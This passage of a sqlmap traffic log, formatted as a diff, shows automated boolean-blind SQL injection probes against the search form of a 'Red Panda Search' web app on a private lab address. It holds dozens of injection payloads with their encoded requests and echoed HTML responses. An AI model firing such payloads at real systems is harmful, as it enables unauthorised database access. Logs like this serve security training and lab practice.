+Date: Sat, 16 Jul 2022 16:50:38 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk AND 2147=2606</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:38] [PAYLOAD] woodenk AND 5913=5913
+[12:50:38] [TRAFFIC OUT] HTTP request [#59]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 32
+Connection: close
+
+name=woodenk%20AND%205913%3D5913
+
+[12:50:38] [TRAFFIC IN] HTTP response [#59] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:38 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk AND 5913=5913</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:38] [PAYLOAD] woodenk AND 8456=5888-- YqBs
+[12:50:38] [TRAFFIC OUT] HTTP request [#60]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 41
+Connection: close
+
+name=woodenk%20AND%208456%3D5888--%20YqBs
+
+[12:50:38] [TRAFFIC IN] HTTP response [#60] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:38 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk AND 8456=5888-- YqBs</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:38] [PAYLOAD] woodenk AND 5913=5913-- Qxxd
+[12:50:38] [TRAFFIC OUT] HTTP request [#61]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 41
+Connection: close
+
+name=woodenk%20AND%205913%3D5913--%20Qxxd
+
+[12:50:39] [TRAFFIC IN] HTTP response [#61] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:38 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk AND 5913=5913-- Qxxd</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:39] [PAYLOAD] woodenk AND 3799=2820# glZv
+[12:50:39] [TRAFFIC OUT] HTTP request [#62]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 42
+Connection: close
+
+name=woodenk%20AND%203799%3D2820%23%20glZv
+
+[12:50:39] [TRAFFIC IN] HTTP response [#62] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:38 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk AND 3799=2820# glZv</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:39] [PAYLOAD] woodenk AND 5913=5913# nYIi
+[12:50:39] [TRAFFIC OUT] HTTP request [#63]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 42
+Connection: close
+
+name=woodenk%20AND%205913%3D5913%23%20nYIi
+
+[12:50:39] [TRAFFIC IN] HTTP response [#63] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:39 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk AND 5913=5913# nYIi</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:39] [PAYLOAD] woodenk) WHERE 6802=6802 AND 4760=3962-- GhUu
+[12:50:39] [TRAFFIC OUT] HTTP request [#64]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 66
+Connection: close
+
+name=woodenk%29%20WHERE%206802%3D6802%20AND%204760%3D3962--%20GhUu
+
+[12:50:39] [TRAFFIC IN] HTTP response [#64] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:39 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) WHERE 6802=6802 AND 4760=3962-- GhUu</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:39] [PAYLOAD] woodenk) WHERE 3118=3118 AND 5913=5913-- AvQy
+[12:50:39] [TRAFFIC OUT] HTTP request [#65]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 66
+Connection: close
+
+name=woodenk%29%20WHERE%203118%3D3118%20AND%205913%3D5913--%20AvQy
+
+[12:50:39] [TRAFFIC IN] HTTP response [#65] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:39 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) WHERE 3118=3118 AND 5913=5913-- AvQy</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:39] [PAYLOAD] woodenk WHERE 7121=7121 AND 2924=9676-- Jnex
+[12:50:39] [TRAFFIC OUT] HTTP request [#66]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 63
+Connection: close
+
+name=woodenk%20WHERE%207121%3D7121%20AND%202924%3D9676--%20Jnex
+
+[12:50:40] [TRAFFIC IN] HTTP response [#66] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:39 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk WHERE 7121=7121 AND 2924=9676-- Jnex</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:40] [PAYLOAD] woodenk WHERE 9970=9970 AND 5913=5913-- hkgi
+[12:50:40] [TRAFFIC OUT] HTTP request [#67]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 63
+Connection: close
+
+name=woodenk%20WHERE%209970%3D9970%20AND%205913%3D5913--%20hkgi
+
+[12:50:40] [TRAFFIC IN] HTTP response [#67] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:39 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk WHERE 9970=9970 AND 5913=5913-- hkgi</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:40] [PAYLOAD] woodenk) AS FDVD WHERE 7766=7766 AND 8213=4351-- ahXE
+[12:50:40] [TRAFFIC OUT] HTTP request [#68]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 78
+Connection: close
+
+name=woodenk%29%20AS%20FDVD%20WHERE%207766%3D7766%20AND%208213%3D4351--%20ahXE
+
+[12:50:40] [TRAFFIC IN] HTTP response [#68] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:40 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AS FDVD WHERE 7766=7766 AND 8213=4351-- ahXE</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:40] [PAYLOAD] woodenk) AS MXqc WHERE 8458=8458 AND 5913=5913-- PCAk
+[12:50:40] [TRAFFIC OUT] HTTP request [#69]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 78
+Connection: close
+
+name=woodenk%29%20AS%20MXqc%20WHERE%208458%3D8458%20AND%205913%3D5913--%20PCAk
+
+[12:50:40] [TRAFFIC IN] HTTP response [#69] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:40 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AS MXqc WHERE 8458=8458 AND 5913=5913-- PCAk</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:40] [PAYLOAD] woodenk` WHERE 8232=8232 AND 9872=1525-- AIhm
+[12:50:40] [TRAFFIC OUT] HTTP request [#70]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 66
+Connection: close
+
+name=woodenk%60%20WHERE%208232%3D8232%20AND%209872%3D1525--%20AIhm
+
+[12:50:40] [TRAFFIC IN] HTTP response [#70] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:40 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk` WHERE 8232=8232 AND 9872=1525-- AIhm</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:40] [PAYLOAD] woodenk` WHERE 7500=7500 AND 5913=5913-- Ufmb
+[12:50:40] [TRAFFIC OUT] HTTP request [#71]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 66
+Connection: close
+
+name=woodenk%60%20WHERE%207500%3D7500%20AND%205913%3D5913--%20Ufmb
+
+[12:50:41] [TRAFFIC IN] HTTP response [#71] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:40 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk` WHERE 7500=7500 AND 5913=5913-- Ufmb</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:41] [PAYLOAD] woodenk`=`woodenk` AND 9461=5780 AND `woodenk`=`woodenk
+[12:50:41] [TRAFFIC OUT] HTTP request [#72]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 86
+Connection: close
+
+name=woodenk%60%3D%60woodenk%60%20AND%209461%3D5780%20AND%20%60woodenk%60%3D%60woodenk
+
+[12:50:41] [TRAFFIC IN] HTTP response [#72] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:40 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk`=`woodenk` AND 9461=5780 AND `woodenk`=`woodenk</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:41] [PAYLOAD] woodenk`=`woodenk` AND 5913=5913 AND `woodenk`=`woodenk
+[12:50:41] [TRAFFIC OUT] HTTP request [#73]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 86
+Connection: close
+
+name=woodenk%60%3D%60woodenk%60%20AND%205913%3D5913%20AND%20%60woodenk%60%3D%60woodenk
+
+[12:50:41] [TRAFFIC IN] HTTP response [#73] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:40 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk`=`woodenk` AND 5913=5913 AND `woodenk`=`woodenk</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:41] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+[12:50:41] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)
+[12:50:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[12:50:41] [PAYLOAD] woodenk') AND 2726=(SELECT (CASE WHEN (2726=8242) THEN 2726 ELSE (SELECT 8242 UNION SELECT 7834) END))-- TXoM
+[12:50:41] [TRAFFIC OUT] HTTP request [#74]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 168
+Connection: close
+
+name=woodenk%27%29%20AND%202726%3D%28SELECT%20%28CASE%20WHEN%20%282726%3D8242%29%20THEN%202726%20ELSE%20%28SELECT%208242%20UNION%20SELECT%207834%29%20END%29%29--%20TXoM
+
+[12:50:41] [TRAFFIC IN] HTTP response [#74] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:41 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AND 2726=(SELECT (CASE WHEN (2726=8242) THEN 2726 ELSE (SELECT 8242 UNION SELECT 7834) END))-- TXoM</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:41] [PAYLOAD] woodenk') AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- Yble
+[12:50:41] [TRAFFIC OUT] HTTP request [#75]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 168
+Connection: close
+
+name=woodenk%27%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20Yble
+
+[12:50:41] [TRAFFIC IN] HTTP response [#75] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:41 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- Yble</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:41] [PAYLOAD] woodenk' AND 1860=(SELECT (CASE WHEN (1860=3583) THEN 1860 ELSE (SELECT 3583 UNION SELECT 4951) END))-- HNHc
+[12:50:41] [TRAFFIC OUT] HTTP request [#76]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 165
+Connection: close
+
+name=woodenk%27%20AND%201860%3D%28SELECT%20%28CASE%20WHEN%20%281860%3D3583%29%20THEN%201860%20ELSE%20%28SELECT%203583%20UNION%20SELECT%204951%29%20END%29%29--%20HNHc
+
+[12:50:41] [TRAFFIC IN] HTTP response [#76] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:41 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 1860=(SELECT (CASE WHEN (1860=3583) THEN 1860 ELSE (SELECT 3583 UNION SELECT 4951) END))-- HNHc</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:41] [PAYLOAD] woodenk' AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- UPFT
+[12:50:41] [TRAFFIC OUT] HTTP request [#77]:
+POST /search HTTP/1.1
+Cache-control: no-cache
